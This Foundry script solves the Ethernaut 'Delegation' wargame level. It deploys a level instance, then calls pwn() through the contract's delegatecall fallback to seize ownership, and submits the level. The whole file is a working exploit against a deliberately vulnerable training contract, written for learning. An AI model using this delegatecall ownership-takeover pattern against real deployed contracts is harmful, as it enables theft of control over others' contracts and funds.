// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "interfaces/IEthernaut.sol";
import { Delegation } from "src/Level06.sol";

contract Attack is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));
    Delegation instance;

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("DEPLOYER_PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance(0x73379d8B82Fda494ee59555f333DF7D44483fD58);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address instanceAddress = address(uint160(uint256(entries[0].topics[2])));
        console2.log(instanceAddress);
        instance = Delegation(instanceAddress);

        (bool success,) = address(instance).call(abi.encodeWithSignature("pwn()"));
        require(success, "Attack failed");

        ethernaut.submitLevelInstance(instanceAddress);
        vm.stopBroadcast();
    }
}
